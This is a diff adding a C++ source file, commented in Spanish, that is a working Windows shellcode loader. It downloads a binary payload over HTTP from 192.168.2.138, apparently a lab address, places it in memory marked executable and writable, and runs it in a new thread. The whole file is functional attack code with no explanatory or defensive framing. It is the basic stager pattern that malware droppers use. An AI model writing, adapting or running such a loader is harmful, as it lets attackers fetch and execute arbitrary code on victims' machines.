@@ -1,0 +1,91 @@
+#include <windows.h>
+#include <winhttp.h>
+#include <iostream>
+#include <vector>
+
+#pragma comment(lib, "winhttp.lib")
+
+// Función para descargar un archivo binario desde un servidor y almacenarlo en un buffer en memoria
+std::vector<BYTE> DownloadShellcode(LPCWSTR serverName, LPCWSTR objectName) {
+    HINTERNET hSession = WinHttpOpen(L"A WinHTTP Example Program/1.0", WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
+    if (!hSession) return {};
+
+    HINTERNET hConnect = WinHttpConnect(hSession, serverName, INTERNET_DEFAULT_HTTP_PORT, 0);
+    if (!hConnect) {
+        WinHttpCloseHandle(hSession);
+        return {};
+    }
+
+    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", objectName, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
+    if (!hRequest) {
+        WinHttpCloseHandle(hConnect);
+        WinHttpCloseHandle(hSession);
+        return {};
+    }
+
+    if (!WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0) || !WinHttpReceiveResponse(hRequest, NULL)) {
+        WinHttpCloseHandle(hRequest);
+        WinHttpCloseHandle(hConnect);
+        WinHttpCloseHandle(hSession);
+        return {};
+    }
+
+    std::vector<BYTE> buffer;
+    DWORD dwSize = 0, dwDownloaded = 0;
+    do {
+        WinHttpQueryDataAvailable(hRequest, &dwSize);
+        if (dwSize > 0) {
+            std::vector<BYTE> tempBuffer(dwSize);
+            WinHttpReadData(hRequest, tempBuffer.data(), dwSize, &dwDownloaded);
+            buffer.insert(buffer.end(), tempBuffer.begin(), tempBuffer.begin() + dwDownloaded);
+        }
+    } while (dwSize > 0);
+
+    WinHttpCloseHandle(hRequest);
+    WinHttpCloseHandle(hConnect);
+    WinHttpCloseHandle(hSession);
+
+    return buffer;
+}
+
+int main() {
+    // Descargar shellcode desde el servidor
+    std::wstring serverName = L"192.168.2.138";
+    std::wstring objectName = L"/test.bin";  // Ruta del shellcode
+    std::vector<BYTE> shellcode = DownloadShellcode(serverName.c_str(), objectName.c_str());
+
+    if (shellcode.empty()) {
+        std::cerr << "Error al descargar el shellcode.\n";
+        return 1;
+    }
+
+    // Tamaño del shellcode descargado
+    SIZE_T sc_len = shellcode.size();
+    void* my_sc_mem;  // Puntero a la memoria asignada
+
+    // Asignar un buffer de memoria con permisos de ejecución y escritura (RWX)
+    my_sc_mem = VirtualAlloc(0, sc_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    if (!my_sc_mem) {
+        std::cerr << "Error al asignar memoria.\n";
+        return 1;
+    }
+
+    // Copiar el shellcode descargado en el buffer de memoria
+    memcpy(my_sc_mem, shellcode.data(), sc_len);
+
+    // Ejecutar el shellcode creando un hilo
+    HANDLE hThread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)my_sc_mem, 0, 0, 0);
+    if (hThread != NULL) {
+        WaitForSingleObject(hThread, INFINITE);  // Esperar a que el hilo finalice
+        CloseHandle(hThread);
+    } else {
+        std::cerr << "Error al crear el hilo para ejecutar el shellcode.\n";
+        VirtualFree(my_sc_mem, 0, MEM_RELEASE);  // Liberar la memoria
+        return 1;
+    }
+
+    // Liberar la memoria después de ejecutar el shellcode
+    VirtualFree(my_sc_mem, 0, MEM_RELEASE);
+
+    return 0;
+}
